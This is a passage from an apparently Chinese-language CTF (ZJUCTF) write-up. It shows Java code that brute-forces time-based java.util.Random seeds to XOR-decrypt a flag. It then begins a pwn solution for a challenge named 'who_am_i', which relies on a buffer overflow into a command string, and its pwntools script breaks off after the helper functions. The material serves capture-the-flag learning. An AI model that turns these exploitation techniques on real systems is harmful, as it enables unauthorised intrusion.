<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">        </span><span class="n">cal</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="mi">2025</span><span class="p">,</span><span class="w"> </span><span class="n">Calendar</span><span class="p">.</span><span class="na">NOVEMBER</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">        </span><span class="n">cal</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">Calendar</span><span class="p">.</span><span class="na">MILLISECOND</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">        </span><span class="c1">// 同样，提前16小时以防时区问题</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">        </span><span class="n">cal</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">Calendar</span><span class="p">.</span><span class="na">HOUR_OF_DAY</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">startTimeMillis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cal</span><span class="p">.</span><span class="na">getTimeInMillis</span><span class="p">();</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">        </span><span class="n">cal</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">Calendar</span><span class="p">.</span><span class="na">HOUR_OF_DAY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"> </span><span class="c1">// 加回来</span>
<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">        </span><span class="n">cal</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">Calendar</span><span class="p">.</span><span class="na">DAY_OF_YEAR</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">endTimeMillis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cal</span><span class="p">.</span><span class="na">getTimeInMillis</span><span class="p">();</span>
<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>
<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">        </span><span class="c1">// === 关键修改：将毫秒时间戳转换为秒级时间戳 ===</span>
<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">startTimeSec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">startTimeMillis</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span>
<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">endTimeSec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">endTimeMillis</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span>
<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>
<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;【方案 B】开始爆破 (使用 Unix 时间戳)...&quot;</span><span class="p">);</span>
<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;搜索秒数范围: 从 &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">startTimeSec</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; 到 &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">endTimeSec</span><span class="p">);</span>
<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>
<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">randomBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="mi">64</span><span class="o">]</span><span class="p">;</span>
<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">potentialFlagBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="mi">64</span><span class="o">]</span><span class="p">;</span>
<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>
<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="w">        </span><span class="c1">// === 关键修改：遍历的是秒，而不是毫秒 ===</span>
<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">startTimeSec</span><span class="p">;</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">endTimeSec</span><span class="p">;</span><span class="w"> </span><span class="n">seed</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a><span class="w">             </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">seed</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">startTimeSec</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">3600</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 每3600秒（1小时）打印一次</span>
<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a><span class="w">                 </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;...B 方案进度: 当前秒数 &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">seed</span><span class="p">);</span>
<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a><span class="w">             </span><span class="p">}</span>
<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>
<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a><span class="w">            </span><span class="n">Random</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="w">            </span><span class="n">r</span><span class="p">.</span><span class="na">nextBytes</span><span class="p">(</span><span class="n">randomBytes</span><span class="p">);</span>
<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">64</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a><span class="w">                </span><span class="n">potentialFlagBytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">targetBytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">randomBytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span>
<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a><span class="w">            </span><span class="p">}</span>
<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>
<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">startsWith</span><span class="p">(</span><span class="n">potentialFlagBytes</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ZJUCTF{&quot;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">ISO_8859_1</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a><span class="w">                </span><span class="c1">// 注意：这里打印时需要将秒转回毫秒才能看到正确日期</span>
<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a><span class="w">                </span><span class="n">validateAndPrint</span><span class="p">(</span><span class="n">seed</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="n">potentialFlagBytes</span><span class="p">,</span><span class="w"> </span><span class="n">seed</span><span class="p">);</span>
<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a><span class="w">                </span><span class="k">return</span><span class="p">;</span>
<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a><span class="w">            </span><span class="p">}</span>
<a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-5-53" name="__codelineno-5-53" href="#__codelineno-5-53"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;\n【方案 B】在指定的时间范围内未找到 Flag。&quot;</span><span class="p">);</span>
<a id="__codelineno-5-54" name="__codelineno-5-54" href="#__codelineno-5-54"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-5-55" name="__codelineno-5-55" href="#__codelineno-5-55"></a>
<a id="__codelineno-5-56" name="__codelineno-5-56" href="#__codelineno-5-56"></a><span class="w">    </span><span class="c1">// 为方案B重载一个打印函数</span>
<a id="__codelineno-5-57" name="__codelineno-5-57" href="#__codelineno-5-57"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">validateAndPrint</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="n">seedMillis</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">potentialFlagBytes</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">actualSeed</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-58" name="__codelineno-5-58" href="#__codelineno-5-58"></a><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;\n[!] 在种子 &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">actualSeed</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; (&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Date</span><span class="p">(</span><span class="n">seedMillis</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;) 发现前缀匹配！正在验证...&quot;</span><span class="p">);</span>
<a id="__codelineno-5-59" name="__codelineno-5-59" href="#__codelineno-5-59"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">flagEndIndex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<a id="__codelineno-5-60" name="__codelineno-5-60" href="#__codelineno-5-60"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">potentialFlagBytes</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">potentialFlagBytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;}&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">flagEndIndex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
<a id="__codelineno-5-61" name="__codelineno-5-61" href="#__codelineno-5-61"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">flagEndIndex</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-62" name="__codelineno-5-62" href="#__codelineno-5-62"></a><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">flagLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flagEndIndex</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<a id="__codelineno-5-63" name="__codelineno-5-63" href="#__codelineno-5-63"></a><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">flagPattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">flagLength</span><span class="o">]</span><span class="p">;</span>
<a id="__codelineno-5-64" name="__codelineno-5-64" href="#__codelineno-5-64"></a><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">arraycopy</span><span class="p">(</span><span class="n">potentialFlagBytes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">flagPattern</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">flagLength</span><span class="p">);</span>
<a id="__codelineno-5-65" name="__codelineno-5-65" href="#__codelineno-5-65"></a><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isPatternValid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<a id="__codelineno-5-66" name="__codelineno-5-66" href="#__codelineno-5-66"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">potentialFlagBytes</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">potentialFlagBytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">flagPattern</span><span class="o">[</span><span class="n">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">flagLength</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">isPatternValid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
<a id="__codelineno-5-67" name="__codelineno-5-67" href="#__codelineno-5-67"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isPatternValid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-68" name="__codelineno-5-68" href="#__codelineno-5-68"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;\n==============================================&quot;</span><span class="p">);</span>
<a id="__codelineno-5-69" name="__codelineno-5-69" href="#__codelineno-5-69"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;!!! 成功找到 Flag !!!&quot;</span><span class="p">);</span>
<a id="__codelineno-5-70" name="__codelineno-5-70" href="#__codelineno-5-70"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;所用的种子 (Unix 秒数): &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">actualSeed</span><span class="p">);</span>
<a id="__codelineno-5-71" name="__codelineno-5-71" href="#__codelineno-5-71"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;对应时间 (大约): &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Date</span><span class="p">(</span><span class="n">seedMillis</span><span class="p">));</span>
<a id="__codelineno-5-72" name="__codelineno-5-72" href="#__codelineno-5-72"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Flag: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">flagPattern</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">ISO_8859_1</span><span class="p">));</span>
<a id="__codelineno-5-73" name="__codelineno-5-73" href="#__codelineno-5-73"></a><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;==============================================&quot;</span><span class="p">);</span>
<a id="__codelineno-5-74" name="__codelineno-5-74" href="#__codelineno-5-74"></a><span class="w">            </span><span class="p">}</span>
<a id="__codelineno-5-75" name="__codelineno-5-75" href="#__codelineno-5-75"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-5-76" name="__codelineno-5-76" href="#__codelineno-5-76"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-5-77" name="__codelineno-5-77" href="#__codelineno-5-77"></a>
<a id="__codelineno-5-78" name="__codelineno-5-78" href="#__codelineno-5-78"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">startsWith</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">prefix</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-5-79" name="__codelineno-5-79" href="#__codelineno-5-79"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">prefix</span><span class="p">.</span><span class="na">length</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<a id="__codelineno-5-80" name="__codelineno-5-80" href="#__codelineno-5-80"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">prefix</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">source</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">prefix</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<a id="__codelineno-5-81" name="__codelineno-5-81" href="#__codelineno-5-81"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<a id="__codelineno-5-82" name="__codelineno-5-82" href="#__codelineno-5-82"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-5-83" name="__codelineno-5-83" href="#__codelineno-5-83"></a><span class="p">}</span>
</code></pre></div></p>
<h2 id="pwn">pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
<h3 id="who_am_i">who_am_i<a class="headerlink" href="#who_am_i" title="Permanent link">&para;</a></h3>
<p>非常简单，读的时候溢出到command里面，再执行就好了
<img alt="alt text" src="../pic/image-1.png" />
脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1">#context.log_level = &#39;debug&#39;</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1">#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="k">def</span><span class="w"> </span><span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="k">def</span><span class="w"> </span><span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>
<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="k">def</span><span class="w"> </span><span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>
<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="k">def</span><span class="w"> </span><span class="nf">r</span><span class="p">():</span>
<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>
<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>
<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="k">def</span><span class="w"> </span><span class="nf">pr</span><span class="p">():</span>
<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">ru</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>
<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="k">def</span><span class="w"> </span><span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>
<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>
<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="k">def</span><span class="w"> </span><span class="nf">itr</span><span class="p">():</span>
<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>
<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>
<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="k">def</span><span class="w"> </span><span class="nf">debug</span><span class="p">():</span>
<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>
<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="n">choice</span><span class="o">=</span><span class="mi">2</span>
<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">1</span><span class="p">):</span>
<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>    <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="s1">    b system</span>
<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a><span class="s1">    c</span>
<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="s1">    &#39;&#39;&#39;</span>
